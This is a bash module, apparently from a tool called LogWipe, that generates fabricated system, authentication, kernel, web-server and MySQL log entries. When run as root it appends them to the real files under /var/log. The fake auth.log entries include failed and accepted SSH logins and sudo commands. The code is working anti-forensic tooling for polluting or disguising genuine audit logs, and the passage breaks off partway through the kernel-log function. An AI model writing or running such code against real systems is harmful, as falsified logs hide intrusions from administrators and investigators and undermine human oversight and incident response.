#!/bin/bash

# Advanced fake log generator module for LogWipe

# Global variables
log_density="medium"
time_frame="24h"
realism_level="high"

# Define standard system log paths for generation
# These will be overridden by configs when available
SYSLOG_PATH="/var/log/syslog"
AUTH_LOG_PATH="/var/log/auth.log"
KERN_LOG_PATH="/var/log/kern.log"
APACHE_ACCESS_LOG_PATH="/var/log/apache2/access.log"
NGINX_ACCESS_LOG_PATH="/var/log/nginx/access.log"
MYSQL_ERROR_LOG_PATH="/var/log/mysql/error.log"

# Function to ensure log directory exists
ensure_log_directory() {
    local log_path="$1"
    local dir_path=$(dirname "$log_path")
    
    if [ ! -d "$dir_path" ]; then
        mkdir -p "$dir_path" 2>/dev/null || { 
            show_notification "Error: Cannot create directory: $dir_path" "error"
            log_action "Error: Cannot create directory: $dir_path"
            return 1
        }
    fi
    return 0
}

# Function to check if a path is writable to system logs
is_real_system_path() {
    local path="$1"
    if [[ "$path" == "/var/log/"* ]]; then 
        if [ "$EUID" -eq 0 ]; then 
            return 0
        fi
    fi
    return 1
}

# Function to determine appropriate log path
get_appropriate_log_path() {
    local original_path="$1"
    local fake_path="logs/fake/$(basename "$original_path")"
    
    # Prefer the real path if it's writable and we're running with proper permissions
    if is_real_system_path "$original_path" && [ -w "$original_path" -o -w "$(dirname "$original_path")" ]; then
        echo "$original_path"
        show_notification "Using real system log path: $original_path" "info"
        log_action "Using real system log path: $original_path"
    else
        # Use fake path for demonstration
        ensure_log_directory "$fake_path"
        echo "$fake_path"
        show_notification "Using demonstration log path: $fake_path" "info"
        log_action "Using demonstration log path: $fake_path"
    fi
}

# Function to generate a random timestamp within a range
generate_random_timestamp() {
    local start_time="$1"
    local end_time="$2"
    
    # Generate random timestamp between start and end
    echo $((start_time + RANDOM * (end_time - start_time) / 32767))
}

# Function to generate fake logs
generate_fake_logs() {
    local type="${1:-all}"
    show_notification "Starting fake log generation..." "info"
    log_action "Started fake log generation with type: $type"
    
    # Make sure we're using the latest config values
    if [ -n "$LOG_DENSITY" ]; then log_density="$LOG_DENSITY"; fi
    if [ -n "$TIME_FRAME" ]; then time_frame="$TIME_FRAME"; fi
    if [ -n "$REALISM_LEVEL" ]; then realism_level="$REALISM_LEVEL"; fi
    
    # Calculate timestamps based on time frame
    local end_time=$(date +%s)
    local start_time
    
    case "$time_frame" in
        "1h")
            start_time=$((end_time - 3600))
            ;;
        "12h")
            start_time=$((end_time - 43200))
            ;;
        "24h")
            start_time=$((end_time - 86400))
            ;;
        "7d")
            start_time=$((end_time - 604800))
            ;;
        "30d")
            start_time=$((end_time - 2592000))
            ;;
        *)
            # Default to 24h
            start_time=$((end_time - 86400))
            ;;
    esac
    
    # Determine number of entries based on density
    local num_entries
    
    case "$log_density" in
        "low")
            num_entries=50
            ;;
        "medium")
            num_entries=200
            ;;
        "high")
            num_entries=500
            ;;
        "very-high")
            num_entries=1000
            ;;
        *)
            # Default to medium
            num_entries=200
            ;;
    esac
    
    # Process by type
    case "$type" in
        "all")
            generate_system_logs $start_time $end_time $num_entries
            generate_auth_logs $start_time $end_time $num_entries
            generate_kernel_logs $start_time $end_time $((num_entries / 2)) # Kernel logs are typically less frequent
            generate_web_logs $start_time $end_time $((num_entries * 2)) # Web logs are typically more frequent
            generate_db_logs $start_time $end_time $num_entries
            ;;
        "system")
            generate_system_logs $start_time $end_time $num_entries
            generate_kernel_logs $start_time $end_time $((num_entries / 2))
            ;;
        "auth")
            generate_auth_logs $start_time $end_time $num_entries
            ;;
        "web")
            generate_web_logs $start_time $end_time $((num_entries * 2))
            ;;
        "database")
            generate_db_logs $start_time $end_time $num_entries
            ;;
        *)
            show_notification "Unknown log type: $type" "error"
            log_action "Error: Unknown log type: $type"
            return 1
            ;;
    esac
    
    show_notification "Fake log generation completed!" "success"
    log_action "Completed fake log generation with type: $type"
    sleep 2
}

# Generate system logs
generate_system_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    
    show_notification "Generating system logs..." "info"
    log_action "Started generating system logs"
    
    # Get appropriate log path
    local system_log_path=$(get_appropriate_log_path "$SYSLOG_PATH")
    
    # Ensure directory exists
    ensure_log_directory "$system_log_path" || return 1
    
    # Create file if it doesn't exist
    if [ ! -f "$system_log_path" ]; then
        touch "$system_log_path" 2>/dev/null || {
            show_notification "Error: Cannot create syslog file: $system_log_path" "error"
            log_action "Error: Cannot create syslog file: $system_log_path"
            return 1
        }
    fi
    
    # Check if file is writable
    if [ ! -w "$system_log_path" ]; then
        show_notification "Error: Cannot write to syslog file: $system_log_path" "error"
        log_action "Error: Cannot write to syslog file: $system_log_path"
        return 1
    fi
    
    # Services and messages - Comprehensive list for realism
    local services=(
        "systemd" "systemd-logind" "systemd-resolved" "systemd-networkd" "systemd-udevd" "systemd-timesyncd"
        "NetworkManager" "wpa_supplicant" "dhclient" "dhcpcd" "avahi-daemon" "cups-browsed"
        "dbus-daemon" "polkitd" "accounts-daemon" "acpid" "cron" "anacron" "atd" 
        "rsyslogd" "syslogd" "auditd" "udisksd" "upower" "thermald" "irqbalance"
        "snapd" "ModemManager" "bluetoothd" "cupsd" "colord" "dnsmasq" "ntpd" "chronyd"
        "sshd" "gdm" "lightdm" "Xorg" "gnome-shell" "packagekitd" "npfd" "tuned"
        "firewalld" "iptables" "ufw" "lvm" "mdadm" "smartd" "lxcfs" "docker" "containerd"
    )
    
    local process_starts=(
        "Starting" "Started" "Launching" "Initializing" "Loading" "Activating" "Enabling"
        "Reloading" "Watching" "Monitoring" "Creating" "Processing" "Reached target"
    )
    
    local process_stops=(
        "Stopping" "Stopped" "Terminating" "Terminated" "Exiting" "Unloading" "Deactivating" 
        "Disabling" "Killing" "Disconnected" "Removed" "Closed" "Finished"
    )
    
    local system_objects=(
        "System" "Basic System" "Default Target" "Multi-User System" "Login Service" "Network Service"
        "Graphical Interface" "Sound Card" "Printer Service" "Bluetooth Service" "Scanner Service"
        "Remote File Systems" "Local File Systems" "Swap" "System Paths" "Timers" "Sockets"
        "D-Bus" "Session" "User Manager" "System Units" "Connection" "Mount Points"
        "Kernel Modules" "Hardware Detection" "System Sensors" "Power Management" "Hibernation"
        "Suspend/Resume" "Pluggable Devices" "USB Controllers" "PCI Devices" "Boot Sequence"
    )
    
    local warnings=(
        "Warning" "Could not process" "Failed to start" "Timed out" "Connection reset" 
        "Watchdog timeout" "Resource temporarily unavailable" "Dependency failed" 
        "Process killed" "Incorrect parameter" "Configuration error" "Access denied"
        "Rate limited" "Cannot allocate memory" "Device busy" "File not found"
        "Permission denied" "Protocol error" "Timeout exceeded" "Service restart limit hit"
        "Duplicate entry found" "Incompatible version" "Bad syntax" "Missing dependency"
    )
    
    local errors=(
        "Failed" "Error" "Critical failure" "Segmentation fault" "Bus error" "Out of memory"
        "Kernel panic" "I/O error" "No space left on device" "Broken pipe" "Connection refused"
        "Host unreachable" "Network unreachable" "Invalid argument" "Operation not permitted"
        "Protocol not supported" "Address already in use" "Connection timed out" "Too many open files"
        "Directory not empty" "File too large" "Read-only file system" "Device not found"
        "Assertion failed" "Operation not supported" "Function not implemented" "Stack overflow"
    )
    
    # Hosts
    local hostname=$(hostname)
    local pids=()
    
    # Generate some realistic PIDs
    for i in {1..20}; do
        pids+=($((RANDOM % 65535 + 1)))
    done
    
    # Priority levels for syslog
    local priorities=("emerg" "alert" "crit" "err" "warning" "notice" "info" "debug")
    
    # Create a realistic timeline with bursts of activity
    local timestamps=()
    for i in $(seq 1 $num_entries); do
        local ts=$(generate_random_timestamp $start_time $end_time)
        timestamps+=($ts)
    done
    
    # Sort timestamps to get chronological order
    IFS=$'\n' sorted_timestamps=($(sort <<<"${timestamps[*]}"))
    unset IFS
    
    # Service startup sequence entries (clustered at boot time)
    local boot_time=$((start_time + RANDOM % 3600)) # Boot within first hour
    local service_start_entries=()
    
    # Generate boot sequence (20% of entries)
    local boot_entry_count=$((num_entries / 5))
    for i in $(seq 1 $boot_entry_count); do
        local service=${services[$RANDOM % ${#services[@]}]}
        local start_action=${process_starts[$RANDOM % ${#process_starts[@]}]}
        local object=${system_objects[$RANDOM % ${#system_objects[@]}]}
        
        # Format timestamp for syslog (boot time + offset for startup sequence)
        local boot_ts=$((boot_time + i*2)) # Sequential boot with 2 sec between services
        local boot_date=$(date -d @$boot_ts "+%b %d %H:%M:%S")
        
        # Create PID
        local pid=${pids[$RANDOM % ${#pids[@]}]}
        
        # Create the log entry
        service_start_entries+=("$boot_date $hostname $service[$pid]: $start_action $object")
    done
    
    # Show progress
    show_notification "Generating system logs (this may take a while)..." "info"
    
    # Track current entry for progress bar
    local current_entry=0
    
    # Write boot sequence first for realism
    for entry in "${service_start_entries[@]}"; do
        echo "$entry" >> "$system_log_path"
        current_entry=$((current_entry + 1))
        
        # Update progress every 10 entries
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $num_entries $current_entry "Generating system logs"
        fi
    done
    
    # Regular log entries (remaining 80%)
    local remaining_entries=$((num_entries - boot_entry_count))
    for i in $(seq 1 $remaining_entries); do
        # Use the sorted timestamp
        local timestamp=${sorted_timestamps[$i + boot_entry_count - 1]}
        local syslog_date=$(date -d @$timestamp "+%b %d %H:%M:%S")
        
        # Random service
        local service=${services[$RANDOM % ${#services[@]}]}
        local pid=${pids[$RANDOM % ${#pids[@]}]}
        
        # Randomly choose message type based on realism level
        local priority_index
        local message_type=$((RANDOM % 100))
        local message=""
        
        # Distribution of message types varies by realism level
        if [ "$realism_level" = "high" ]; then
            # High realism: More warnings and errors
            if [ $message_type -lt 60 ]; then
                # 60% info messages
                local action
                if [ $((RANDOM % 2)) -eq 0 ]; then
                    action=${process_starts[$RANDOM % ${#process_starts[@]}]}
                else
                    action=${process_stops[$RANDOM % ${#process_stops[@]}]}
                fi
                local object=${system_objects[$RANDOM % ${#system_objects[@]}]}
                message="$action $object"
                priority_index=6 # info
            elif [ $message_type -lt 85 ]; then
                # 25% warning messages
                local warning=${warnings[$RANDOM % ${#warnings[@]}]}
                message="$warning: $(echo $service | tr '[:upper:]' '[:lower:]')-daemon"
                priority_index=4 # warning
            else
                # 15% error messages
                local error=${errors[$RANDOM % ${#errors[@]}]}
                message="$error: process $pid exited with status $(( RANDOM % 255 + 1 ))"
                priority_index=3 # err
            fi
        else
            # Standard realism: Fewer warnings and errors
            if [ $message_type -lt 80 ]; then
                # 80% info messages
                local action
                if [ $((RANDOM % 2)) -eq 0 ]; then
                    action=${process_starts[$RANDOM % ${#process_starts[@]}]}
                else
                    action=${process_stops[$RANDOM % ${#process_stops[@]}]}
                fi
                local object=${system_objects[$RANDOM % ${#system_objects[@]}]}
                message="$action $object"
                priority_index=6 # info
            elif [ $message_type -lt 95 ]; then
                # 15% warning messages
                local warning=${warnings[$RANDOM % ${#warnings[@]}]}
                message="$warning: $(echo $service | tr '[:upper:]' '[:lower:]')-daemon"
                priority_index=4 # warning
            else
                # 5% error messages
                local error=${errors[$RANDOM % ${#errors[@]}]}
                message="$error: process $pid exited with status $(( RANDOM % 255 + 1 ))"
                priority_index=3 # err
            fi
        fi
        
        # Get the priority name
        local priority=${priorities[$priority_index]}
        
        # Create the log entry with priority
        local log_entry="$syslog_date $hostname $service[$pid]: <$priority> $message"
        
        # Write to syslog file
        echo "$log_entry" >> "$system_log_path"
        
        current_entry=$((current_entry + 1))
        
        # Update progress every 10 entries
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $num_entries $current_entry "Generating system logs"
        fi
    done
    
    show_notification "System logs generation complete!" "success"
    log_action "Completed generating system logs"
}

# Generate authentication logs
generate_auth_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    
    show_notification "Generating authentication logs..." "info"
    log_action "Started generating authentication logs"
    
    # Ensure directory exists
    ensure_log_directory "$AUTH_LOG_PATH" || return 1
    
    # Verify auth log file exists
    if [ ! -f "$AUTH_LOG_PATH" ]; then
        touch "$AUTH_LOG_PATH" 2>/dev/null || {
            show_notification "Error: Cannot create auth log file: $AUTH_LOG_PATH" "error"
            log_action "Error: Cannot create auth log file: $AUTH_LOG_PATH"
            return 1
        }
    fi
    
    # Check if file is writable
    if [ ! -w "$AUTH_LOG_PATH" ]; then
        show_notification "Error: Cannot write to auth log file: $AUTH_LOG_PATH" "error"
        log_action "Error: Cannot write to auth log file: $AUTH_LOG_PATH"
        return 1
    fi
    
    # Authentication events
    local auth_services=("sshd" "sudo" "su" "login" "systemd-logind" "polkit-agent" "gdm-password")
    local users=("root" "admin" "user" "john" "alice" "bob" "dave" "carol" "eve" "sysadmin" "www-data")
    local remote_ips=("192.168.1.100" "192.168.1.101" "10.0.0.15" "10.0.0.23" "172.16.0.5" "172.16.0.10" "8.8.8.8" "1.1.1.1")
    local auth_messages=(
        "Accepted password for USER from IP port 22"
        "Failed password for USER from IP port 22"
        "Failed password for invalid user USER from IP port 22"
        "USER : TTY=pts/0 ; PWD=/home/USER ; USER=root ; COMMAND=/usr/bin/nano /etc/passwd"
        "session opened for user USER by (uid=0)"
        "session closed for user USER"
        "USER : authentication failure; logname= uid=0 euid=0 tty=/dev/pts/0 ruser= rhost=localhost"
    )
    
    # Success/failure distribution based on realism level
    local failure_rate
    case "$realism_level" in
        "low")
            failure_rate=10
            ;;
        "medium")
            failure_rate=25
            ;;
        "high")
            failure_rate=40
            ;;
        *)
            # Default to medium
            failure_rate=25
            ;;
    esac
    
    # Show progress
    for i in $(seq 1 $num_entries); do
        show_progress $num_entries $i "Generating auth logs"
        
        # Generate random timestamp between start and end time
        local timestamp=$(generate_random_timestamp $start_time $end_time)
        
        # Format timestamp for auth log
        local auth_date=$(date -d @$timestamp "+%b %d %H:%M:%S")
        
        # Random service, user, and IP
        local auth_service=${auth_services[$RANDOM % ${#auth_services[@]}]}
        local user=${users[$RANDOM % ${#users[@]}]}
        local remote_ip=${remote_ips[$RANDOM % ${#remote_ips[@]}]}
        local host=$(hostname)
        
        # Random message template
        local auth_message=${auth_messages[$RANDOM % ${#auth_messages[@]}]}
        
        # Replace placeholders
        auth_message=${auth_message//USER/$user}
        auth_message=${auth_message//IP/$remote_ip}
        
        # Create the log entry
        local log_entry="$auth_date $host $auth_service: $auth_message"
        
        # Write to auth log file
        echo "$log_entry" >> "$AUTH_LOG_PATH"
        
        # Add small delay to prevent CPU overuse
        sleep 0.01
    done
    
    show_notification "Authentication logs generation complete!" "success"
    log_action "Completed generating authentication logs"
}

# Generate web server logs
generate_web_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    
    show_notification "Generating web server logs..." "info"
    log_action "Started generating web server logs"
    
    # Ensure directories exist
    ensure_log_directory "$APACHE_ACCESS_LOG_PATH" || return 1
    ensure_log_directory "$NGINX_ACCESS_LOG_PATH" || return 1
    
    # Determine web server log file - Prefer Apache, then Nginx
    local web_log_path
    if [ -e "$APACHE_ACCESS_LOG_PATH" ] && [ -w "$APACHE_ACCESS_LOG_PATH" ]; then
        web_log_path="$APACHE_ACCESS_LOG_PATH"
    elif [ -e "$NGINX_ACCESS_LOG_PATH" ] && [ -w "$NGINX_ACCESS_LOG_PATH" ]; then
         web_log_path="$NGINX_ACCESS_LOG_PATH"
    elif ensure_log_directory "$APACHE_ACCESS_LOG_PATH" && touch "$APACHE_ACCESS_LOG_PATH" 2>/dev/null; then
         web_log_path="$APACHE_ACCESS_LOG_PATH"
    elif ensure_log_directory "$NGINX_ACCESS_LOG_PATH" && touch "$NGINX_ACCESS_LOG_PATH" 2>/dev/null; then
         web_log_path="$NGINX_ACCESS_LOG_PATH"
    else
        show_notification "Error: Cannot find or write to suitable web log file (tried Apache/Nginx paths)" "error"
        log_action "Error: Cannot find or write to web log files"
        return 1
    fi
    
    # Check if file is writable (re-check after potential creation)
    if [ ! -w "$web_log_path" ]; then
        show_notification "Error: Cannot write to web log file: $web_log_path" "error"
        log_action "Error: Cannot write to web log file: $web_log_path"
        return 1
    fi
    
    # Web server log components
    local ips=("192.168.1.100" "192.168.1.101" "10.0.0.15" "10.0.0.23" "172.16.0.5" "172.16.0.10" 
             "8.8.8.8" "1.1.1.1" "203.0.113.1" "198.51.100.2" "192.0.2.3")
    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
    )
    local urls=(
        "/index.html"
        "/about"
        "/contact"
        "/login"
        "/logout"
        "/dashboard"
        "/profile"
        "/settings"
        "/api/v1/users"
        "/api/v1/data"
        "/images/logo.png"
        "/css/style.css"
        "/js/main.js"
    )
    local methods=("GET" "POST" "PUT" "DELETE")
    local status_codes=("200" "201" "301" "302" "400" "401" "403" "404" "500" "503")
    
    # Show progress
    for i in $(seq 1 $num_entries); do
        show_progress $num_entries $i "Generating web logs"
        
        # Generate random timestamp between start and end time
        local timestamp=$(generate_random_timestamp $start_time $end_time)
        
        # Format timestamp for web log (Apache/Nginx format)
        local web_date=$(date -d @$timestamp "+[%d/%b/%Y:%H:%M:%S %z]")
        
        # Random components
        local ip=${ips[$RANDOM % ${#ips[@]}]}
        local user_agent=${user_agents[$RANDOM % ${#user_agents[@]}]}
        local url=${urls[$RANDOM % ${#urls[@]}]}
        local method=${methods[$RANDOM % ${#methods[@]}]}
        
        # Status code weighted by realism level
        local status_code
        local random_value=$((RANDOM % 100))
        
        if [ "$realism_level" = "high" ]; then
            # High realism: 75% success, 20% redirects, 5% errors
            if [ $random_value -lt 75 ]; then
                status_code="200"
            elif [ $random_value -lt 95 ]; then
                status_code=${status_codes[2+$RANDOM%2]}  # 301 or 302
            else
                status_code=${status_codes[5+$RANDOM%5]}  # 401, 403, 404, 500, 503
            fi
        else
            # Lower realism: 90% success, 5% redirects, 5% errors
            if [ $random_value -lt 90 ]; then
                status_code="200"
            elif [ $random_value -lt 95 ]; then
                status_code=${status_codes[2+$RANDOM%2]}  # 301 or 302
            else
                status_code=${status_codes[5+$RANDOM%5]}  # 401, 403, 404, 500, 503
            fi
        fi
        
        # Random response size (bytes)
        local response_size=$((RANDOM % 100000 + 100))
        
        # Create the log entry
        local log_entry="$ip - - $web_date \"$method $url HTTP/1.1\" $status_code $response_size \"http://example.com$url\" \"$user_agent\""
        
        # Write to web log file
        echo "$log_entry" >> "$web_log_path"
        
        # Add small delay to prevent CPU overuse
        sleep 0.01
    done
    
    show_notification "Web server logs generation complete!" "success"
    log_action "Completed generating web server logs"
}

# Generate database logs
generate_db_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    
    show_notification "Generating database logs..." "info"
    log_action "Started generating database logs"
    
    # Ensure directory exists
    ensure_log_directory "$MYSQL_ERROR_LOG_PATH" || return 1
    
    # Verify database log file exists
    if [ ! -f "$MYSQL_ERROR_LOG_PATH" ]; then
        touch "$MYSQL_ERROR_LOG_PATH" 2>/dev/null || {
            show_notification "Error: Cannot create database log file: $MYSQL_ERROR_LOG_PATH" "error"
            log_action "Error: Cannot create database log file: $MYSQL_ERROR_LOG_PATH"
            return 1
        }
    fi
    
    # Check if file is writable
    if [ ! -w "$MYSQL_ERROR_LOG_PATH" ]; then
        show_notification "Error: Cannot write to database log file: $MYSQL_ERROR_LOG_PATH" "error"
        log_action "Error: Cannot write to database log file: $MYSQL_ERROR_LOG_PATH"
        return 1
    fi
    
    # Database log components
    local log_levels=("Note" "Warning" "Error" "System")
    local db_messages=(
        "Thread ID TABLE: 1 opened table 'users'"
        "Thread ID TABLE: 1 closed tables"
        "Thread ID QUERY: SELECT * FROM users WHERE id = 1"
        "Thread ID QUERY: UPDATE settings SET value = 'new_value' WHERE name = 'setting_name'"
        "Thread ID QUERY: INSERT INTO logs (timestamp, level, message) VALUES (NOW(), 'info', 'User logged in')"
        "Thread ID QUERY: DELETE FROM sessions WHERE expiry < NOW()"
        "Thread ID ERROR: Got error TABLE from storage engine"
        "Thread ID ERROR: Can't find record in TABLE"
        "InnoDB: Log sequence number TABLE; transaction ID TABLE"
        "InnoDB: TABLE log i/o's done"
        "InnoDB: Initializing buffer pool, size = TABLE"
        "InnoDB: Database was not shut down normally!"
        "Connect TABLE@localhost on TABLE using Socket"
        "Slave I/O thread: connected to master 'repl@TABLE:3306', replication started"
    )
    local thread_ids=("1234" "5678" "9012" "3456" "7890")
    local table_names=("users" "settings" "logs" "sessions" "products" "orders" "categories")
    
    # Show progress
    for i in $(seq 1 $num_entries); do
        show_progress $num_entries $i "Generating database logs"
        
        # Generate random timestamp between start and end time
        local timestamp=$(generate_random_timestamp $start_time $end_time)
        
        # Format timestamp for MySQL log
        local db_date=$(date -d @$timestamp "+%Y-%m-%d %H:%M:%S")
        
        # Random components
        local log_level=${log_levels[$RANDOM % ${#log_levels[@]}]}
        local thread_id=${thread_ids[$RANDOM % ${#thread_ids[@]}]}
        local table_name=${table_names[$RANDOM % ${#table_names[@]}]}
        
        # Get random message and replace placeholders
        local db_message=${db_messages[$RANDOM % ${#db_messages[@]}]}
        db_message=${db_message//TABLE/$table_name}
        db_message=${db_message//ID/$thread_id}
        
        # Create the log entry
        local log_entry="$db_date [$log_level] $db_message"
        
        # Write to database log file
        echo "$log_entry" >> "$MYSQL_ERROR_LOG_PATH"
        
        # Add small delay to prevent CPU overuse
        sleep 0.01
    done
    
    show_notification "Database logs generation complete!" "success"
    log_action "Completed generating database logs"
}

# Generate kernel logs
generate_kernel_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    
    show_notification "Generating kernel logs..." "info"
    log_action "Started generating kernel logs"
    
    # Get appropriate log path
    local kern_log_path=$(get_appropriate_log_path "$KERN_LOG_PATH")
    
    # Ensure directory exists
    ensure_log_directory "$kern_log_path" || return 1
    
    # Create file if it doesn't exist
    if [ ! -f "$kern_log_path" ]; then
        touch "$kern_log_path" 2>/dev/null || {
            show_notification "Error: Cannot create kernel log file: $kern_log_path" "error"
            log_action "Error: Cannot create kernel log file: $kern_log_path"
            return 1
        }
    fi
    
    # Check if file is writable
    if [ ! -w "$kern_log_path" ]; then
        show_notification "Error: Cannot write to kernel log file: $kern_log_path" "error"
        log_action "Error: Cannot write to kernel log file: $kern_log_path"
        return 1
    fi
    
    # Kernel log components - Comprehensive for realism
    local kernel_subsystems=(
        "kernel" "init" "memory" "cpu" "acpi" "pci" "usb" "scsi" "block" "ata" "sda" "sdb" "sdc"
        "ext4" "xfs" "btrfs" "device-mapper" "dm-crypt" "loop" "ipv6" "ipv4" "tcp" "udp" "netfilter"
        "iptables" "bridge" "wifi" "bluetooth" "snd" "input" "hid" "thermal" "battery" "i915" "amdgpu"
        "nvidia" "intel_pstate" "perf" "audit" "apparmor" "selinux" "cgroup" "vfs" "inotify" "kvm"
        "virtio" "docker" "zfs" "systemd" "udev" "rtc" "gpio" "spi" "i2c" "mmc" "wmi" "tpm" "firmware"
    )
    
    local boot_messages=(
        "Command line: BOOT_IMAGE=/vmlinuz-5.15.0-76-generic root=UUID=43c9a908-9d36-40e8-92ac-3f351e3b3999 ro"
        "BIOS-provided physical RAM map:"
        "ACPI: RSDP 0x00000000000F0000 000024 (v02 DELL  )"
        "ACPI: XSDT 0x00000000C9FFE120 00008C (v01 DELL   CBX3     01072009 AMI  00010013)"
        "PCI: MMCONFIG for domain 0000 [bus 00-ff] at [mem 0xe0000000-0xefffffff]"
        "Reserving Intel graphics memory at [mem 0xda800000-0xdfefffff]"
        "Memory: 15815700K/16586552K available (14339K kernel code, 2770K rwdata, 5100K rodata)"
        "SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=8, Nodes=1"
        "ftrace: allocating 44898 entries in 176 pages"
        "rcu: Hierarchical RCU implementation."
        "NR_IRQS: 65792, nr_irqs: 2048, preallocated irqs: 16"
        "Console: colour dummy device 80x25"
        "printk: console [tty0] enabled"
        "ACPI: Core revision 20210730"
        "clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x24089c51b93, max_idle_ns: 440795253511 ns"
        "clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 133484882848 ns"
    )
    
    local info_messages=(
        "Adding %dMB swap on /dev/sda2. Priority:-2 extents:1 across:%dMB"
        "EXT4-fs (sda1): mounted filesystem with ordered data mode"
        "input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input3"
        "registered new interface driver usb-storage"
        "usbcore: registered new interface driver usbhid"
        "usbhid: USB HID core driver"
        "Intel(R) Wireless WiFi driver for Linux"
        "iwlwifi 0000:04:00.0: loaded firmware version 46.93d9bf89.0"
        "Bluetooth: Core ver 2.22"
        "NET: Registered protocol family 31"
        "Bluetooth: HCI device and connection manager initialized"
        "Bluetooth: HCI socket layer initialized"
        "Bluetooth: BNEP filter registered"
        "IPv6: ADDRCONF(NETDEV_UP): wlan0: link is not ready"
        "r8169 0000:03:00.0 eth0: link up"
        "IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready"
        "EDAC sbridge: Seeking for: PCI ID 8086:3ca0"
        "EDAC sbridge: Seeking for: PCI ID 8086:3ca8"
        "EDAC sbridge: Seeking for: PCI ID 8086:3c71"
        "wlan0: authenticate with 04:a1:51:92:c7:3a"
        "wlan0: send auth to 04:a1:51:92:c7:3a (try 1/3)"
        "wlan0: authenticated"
        "wlan0: associate with 04:a1:51:92:c7:3a (try 1/3)"
        "wlan0: RX AssocResp from 04:a1:51:92:c7:3a (capab=0x411 status=0)"
        "wlan0: associated"
        "IPv6: ADDRCONF(NETDEV_CHANGE): wlan0: link becomes ready"
        "perf: interrupt took too long (3133 > 3131), lowering kernel.perf_event_max_sample_rate to 63750"
        "PM: suspend entry (deep)"
        "Filesystems sync: 0.01 seconds"
        "Freezing user space processes ... (elapsed 0.001 seconds) done."
        "OOM killer disabled"
        "Freezing remaining freezable tasks ... (elapsed 0.001 seconds) done."
        "printk: Suspending console(s) (use no_console_suspend to debug)"
        "ACPI: PM: Preparing to enter system sleep state S3"
        "ACPI: PM: Saving platform NVS memory"
        "PM: suspend devices took 2.23 seconds"
        "ACPI: PM: Low-level resume complete"
        "PM: resume devices took 2.10 seconds"
        "OOM killer enabled"
        "PM: suspend exit"
    )
    
    local warning_messages=(
        "ACPI BIOS Error (bug): Could not resolve symbol [_SB.PCI0.VID.LCD_._BCM], AE_NOT_FOUND"
        "Cannot read proc file system: 3 - Operation not permitted."
        "Cannot read proc file system: 4 - No such file or directory."
        "CIFS VFS: Free previous auth_key.response"
        "CPU %d: Core temperature above threshold, cpu clock throttled"
        "CPU %d: Core temperature/speed normal"
        "Device has EFI Firmware. Use 'setup-disk -e /dev/sda' to install boot loader, or install grub manually."
        "devfreq: Failed to add devfreq device"
        "Couldn't get size: 0x00000009"
        "PM: Some devices failed to suspend, or early wake event detected"
        "USB device not accepting new address (error=-71)"
        "ACPI: \\_SB_.PCI0.PEG0.VID_.ATPX: Evaluation failed"
        "IRQ 18: no longer affine to CPU%d"
        "broken atomic modeset userspace detected, disabling atomic"
        "direct firmware load for iwlwifi-7265D-26.ucode failed with error -2"
        "usb 1-2: reset high-speed USB device number 2 using ehci-pci"
        "clocksource: timekeeping watchdog on CPU%d: HPET watchdog reset due to Nonstop/Jumpy timer"
        "DMAR: [Firmware Bug]: No firmware reserved region can cover this RMRR [0x000000007b000000-0x000000007fffffff]"
        "nvme nvme0: I/O %d QID %d timeout, disable controller"
        "nvme nvme0: controller is down; restarting queue %d"
    )
    
    local error_messages=(
        "snd_hda_intel 0000:00:1f.3: IRQ timing workaround is activated for card #0. Suggest a bigger bdl_pos_adj."
        "BUG: soft lockup - CPU#%d stuck for %ds! [process_name:%d]"
        "BUG: kernel NULL pointer dereference, address: 0000000000000000"
        "Kernel panic - not syncing: Fatal exception"
        "Out of memory: Kill process %d (process_name) score %d or sacrifice child"
        "EXT4-fs error (device sda1): ext4_lookup:%d: inode #%d: comm %s: deleted inode referenced: %d"
        "blk_update_request: I/O error, dev sda, sector %d op 0x0:(READ) flags 0x0 phys_seg %d prio class 0"
        "ata1.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0"
        "ata1.00: irq_stat 0x40000008"
        "ata1.00: failed command: READ DMA"
        "ata1.00: cmd 25/00:08:18:a0:35/00:00:1f:00:00/e0 tag 0 dma 4096 in"
        "nvme: NVME controller is not ready after %d seconds"
        "nouveau: probe of 0000:01:00.0 failed with error -%d"
        "NVRM: GPU at PCI:%04x:%02x:%02x.%x has fallen off the bus"
        "NMI watchdog: BUG: soft lockup - CPU#%d stuck for %ds! [swapper/0:%d]"
        "INFO: task %s:%d blocked for more than %d seconds."
        "Not tainted %d.%d.%d #1"
        "Call Trace:"
        " schedule+0x%x/0x%x"
        " schedule_timeout+0x%x/0x%x"
        " io_schedule_timeout+0x%x/0x%x"
        "Unrecovered read error - auto reallocate failed"
    )
    
    # Create timeline with boot sequence at the beginning
    local timestamps=()
    
    # Boot time should be close to start of time range
    local boot_time=$((start_time + RANDOM % 60))
    
    # Generate boot sequence entries (around 15%)
    local boot_entry_count=${#boot_messages[@]}
    local remaining_count=$((num_entries - boot_entry_count))
    
